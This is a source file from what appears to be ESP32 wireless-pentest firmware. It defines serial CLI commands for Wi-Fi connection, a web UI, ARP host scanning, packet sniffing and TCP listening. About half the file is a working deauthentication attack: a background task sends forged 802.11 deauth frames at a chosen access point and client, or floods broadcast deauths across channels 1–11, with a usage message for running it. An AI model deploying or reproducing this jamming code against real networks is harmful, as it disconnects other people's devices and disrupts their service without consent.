#include "wifi_commands.h"
#include "core/wifi/webInterface.h"
#include "core/wifi/wifi_common.h" //to return MAC addr
#include <globals.h>
#include "modules/wifi/wifi_atks.h"
#include "esp_wifi.h"
#if !defined(LITE_VERSION)
#include "esp_netif.h"
#include "esp_netif_net_stack.h"
#include "modules/wifi/sniffer.h"
#include "modules/wifi/tcp_utils.h"
#include <modules/ethernet/ARPScanner.h>
// #include "modules/wifi/responder.h"
#endif
uint32_t wifiCallback(cmd *c) {
    Command cmd(c);
    Argument statusArg = cmd.getArgument("status");
    String status = statusArg.getValue();
    status.trim();

    Argument ssidArg = cmd.getArgument("ssid");
    String ssid = ssidArg.getValue();
    ssid.trim();

    Argument pwdArg = cmd.getArgument("pwd");
    String pwd = pwdArg.getValue();
    pwd.trim();

    if (status == "off") {
        wifiDisconnect();
        return true;
    } else if (status == "on") {
        if (wifiConnected) {
            serialDevice->println("Wifi already connected");
            return true;
        }
        if (wifiConnecttoKnownNet()) return true;
        wifiDisconnect();
        return _setupAP();

    } else if (status == "add" && ssid != "" && pwd != "") {
        sasConfig.addWifiCredential(ssid, pwd);
        return true;
    } else {
        serialDevice->println(
            "Invalid status: " + status +
            "\n"
            "Possible commands: \n"
            "-> wifi off (Disconnects Wifi)\n"
            "-> wifi on  (Connects to a known Wifi network. if there's no known network, starts in AP Mode)\n"
            "-> wifi add SSID Password (adds a network to the list)"
        );
        return false;
    }
}

uint32_t webuiCallback(cmd *c) {
    Command cmd(c);

    Argument arg = cmd.getArgument("noAp");
    bool noAp = arg.isSet();

    serialDevice->println(String("Starting Web UI ") + !noAp ? "AP" : "STA");
    serialDevice->println("Press ESC to quit");
    startWebUi(!noAp); // MEMO: will quit when check(EscPress)

    return true;
}
#if !defined(LITE_VERSION)
uint32_t scanHostsCallback(cmd *c) {
    esp_netif_t *esp_netinterface = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (esp_netinterface == nullptr) {
        Serial.println("Failed to get netif handle\nTry connecting to a network first");
        return false;
    }

    ARPScanner{esp_netinterface};

    return true;
}

uint32_t snifferCallback(cmd *c) {
    sniffer_setup();

    return true;
}

uint32_t listenTCPCallback(cmd *c) {
    if (!wifiConnected) {
        Serial.println("Connect to a WiFi first.");
        return false;
    }

    listenTcpPort();

    return true;
}
#endif

// Background task and parameters for targeted deauth
TaskHandle_t deauthTaskHandle = nullptr;
bool deauthTaskRunning = false;

struct DeauthParams {
    uint8_t ap_mac[6];
    uint8_t client_mac[6];
    uint8_t channel;
    bool is_flood;
};
DeauthParams activeDeauthParams;

void deauthWorkerTask(void *parameter) {
    DeauthParams *params = (DeauthParams *)parameter;
    uint8_t local_frame[26];
    memcpy(local_frame, deauth_frame_default, 26);
    
    // Set target client MAC address (destination)
    memcpy(&local_frame[4], params->client_mac, 6);
    // Set transmitter AP MAC address (source)
    memcpy(&local_frame[10], params->ap_mac, 6);
    // Set BSSID
    memcpy(&local_frame[16], params->ap_mac, 6);

    serialDevice->println("[Deauth] Background task started successfully on Core 1.");
    
    if (params->is_flood) {
        serialDevice->println("[Deauth] Initiating continuous multi-channel broadcast flood...");
        while (deauthTaskRunning) {
            for (uint8_t ch = 1; ch <= 11; ch++) {
                if (!deauthTaskRunning) break;
                esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
                vTaskDelay(pdMS_TO_TICKS(10));
                
                memset(local_frame, 0, 26);
                memcpy(local_frame, deauth_frame_default, 26);
                memset(&local_frame[4], 0xFF, 6); // Destination: broadcast
                
                for (int i = 0; i < 5; i++) {
                    send_raw_frame(local_frame, 26);
                    vTaskDelay(pdMS_TO_TICKS(5));
                }
            }
        }
    } else {
        esp_err_t err = esp_wifi_set_channel(params->channel, WIFI_SECOND_CHAN_NONE);
        if (err != ESP_OK) {
            serialDevice->println("[Deauth] Error: Failed to set target WiFi channel.");
        }
        
        serialDevice->printf("[Deauth] Active target BSSID: %02X:%02X:%02X:%02X:%02X:%02X on Channel %d\n",
                             params->ap_mac[0], params->ap_mac[1], params->ap_mac[2],
                             params->ap_mac[3], params->ap_mac[4], params->ap_mac[5], params->channel);

        while (deauthTaskRunning) {
            send_raw_frame(local_frame, 26);
            vTaskDelay(pdMS_TO_TICKS(100)); // Send deauth every 100ms
        }
    }

    serialDevice->println("[Deauth] Background task terminated cleanly.");
    deauthTaskHandle = nullptr;
    vTaskDelete(nullptr);
}

uint32_t deauthCallback(cmd *c) {
    Command cmd(c);
    Argument actionArg = cmd.getArgument("action");
    String action = actionArg.getValue();
    action.trim();
    action.toLowerCase();

    if (action == "stop") {
        if (!deauthTaskRunning) {
            serialDevice->println("[Deauth] No active deauth task is currently running.");
            return true;
        }
        deauthTaskRunning = false;
        serialDevice->println("[Deauth] Stopping background task...");
        WiFi.disconnect(true);
        WiFi.mode(WIFI_OFF);
        return true;
    }

    if (action == "target") {
        if (deauthTaskRunning) {
            serialDevice->println("[Deauth] A task is already active. Stop it first via 'deauth stop'.");
            return false;
        }

        Argument apArg = cmd.getArgument("ap");
        String apStr = apArg.getValue();
        apStr.trim();

        Argument clientArg = cmd.getArgument("client");
        String clientStr = clientArg.getValue();
        clientStr.trim();
        if (clientStr == "") {
            clientStr = "FF:FF:FF:FF:FF:FF";
        }

        Argument chanArg = cmd.getArgument("channel");
        String chanStr = chanArg.getValue();
        chanStr.trim();
        uint8_t channel = chanStr != "" ? chanStr.toInt() : 1;

        if (apStr == "") {
            serialDevice->println("[Deauth] Error: AP BSSID parameter is required.");
            return false;
        }

        uint8_t ap_mac[6];
        uint8_t client_mac[6];
        if (sscanf(apStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &ap_mac[0], &ap_mac[1], &ap_mac[2], &ap_mac[3], &ap_mac[4], &ap_mac[5]) != 6) {
            serialDevice->println("[Deauth] Error: Invalid AP BSSID format.");
            return false;
        }
        if (sscanf(clientStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &client_mac[0], &client_mac[1], &client_mac[2], &client_mac[3], &client_mac[4], &client_mac[5]) != 6) {
            serialDevice->println("[Deauth] Error: Invalid Client BSSID format.");
            return false;
        }

        WiFi.mode(WIFI_MODE_APSTA);
        
        memcpy(activeDeauthParams.ap_mac, ap_mac, 6);
        memcpy(activeDeauthParams.client_mac, client_mac, 6);
        activeDeauthParams.channel = channel;
        activeDeauthParams.is_flood = false;

        deauthTaskRunning = true;
        xTaskCreatePinnedToCore(
            deauthWorkerTask,
            "deauthWorker",
            4096,
            &activeDeauthParams,
            5,
            &deauthTaskHandle,
            1
        );
        return true;
    }

    if (action == "flood") {
        if (deauthTaskRunning) {
            serialDevice->println("[Deauth] A task is already active. Stop it first via 'deauth stop'.");
            return false;
        }

        WiFi.mode(WIFI_MODE_APSTA);
        activeDeauthParams.is_flood = true;
        deauthTaskRunning = true;
        
        xTaskCreatePinnedToCore(
            deauthWorkerTask,
            "deauthWorker",
            4096,
            &activeDeauthParams,
            5,
            &deauthTaskHandle,
            1
        );
        return true;
    }

    serialDevice->println(
        "Usage:\n"
        "  deauth target <ap_mac> [client_mac] [channel]\n"
        "  deauth flood\n"
        "  deauth stop\n"
    );
    return false;
}

/*
uint32_t responderCallback(cmd *c) {
    if (!wifiConnected) {
        Serial.println("Connect to a WiFi first.");
        return false;
    }

    responder();

    return true;
}
*/

void createWifiCommands(SimpleCLI *cli) {
    Command webuiCmd = cli->addCommand("webui", webuiCallback);
    webuiCmd.addFlagArg("noAp");

    Command wifiCmd = cli->addCommand("wifi", wifiCallback);
    wifiCmd.addPosArg("status");
    wifiCmd.addPosArg("ssid", "");
    wifiCmd.addPosArg("pwd", "");

#if !defined(LITE_VERSION)

    Command ScanHostsCmd = cli->addCommand("arp", scanHostsCallback);

    Command listenTCPCmd =
        cli->addCommand("listen", listenTCPCallback); // TODO: make possible to select port to open via Serial

    Command snifferCmd =
        cli->addCommand("sniffer", snifferCallback); // TODO: be able to exit from it from Serial

#endif
    // Command responderCmd = cli->addCommand("responder", responderCallback); TODO

    Command deauthCmd = cli->addCommand("deauth", deauthCallback);
    deauthCmd.addPosArg("action");
    deauthCmd.addPosArg("ap", "");
    deauthCmd.addPosArg("client", "");
    deauthCmd.addPosArg("channel", "");
}
